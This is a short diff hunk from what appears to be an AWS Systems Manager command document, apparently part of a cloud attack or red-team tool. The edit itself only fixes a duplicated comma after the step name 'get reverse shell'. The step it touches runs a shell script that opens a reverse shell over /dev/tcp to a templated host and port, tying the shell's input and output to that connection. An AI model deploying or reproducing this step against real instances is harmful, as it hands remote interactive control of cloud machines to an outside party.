@@ -15,7 +15,7 @@
   "mainSteps": [
     {
       "action": "aws:runShellScript",
-      "name": "get reverse shell",,
+      "name": "get reverse shell",
       "inputs": {
         "runCommand": [
           "0<&196;exec 196<>/dev/tcp/{{ host }}/{{ port }}; sh <&196 >&196 2>&196"
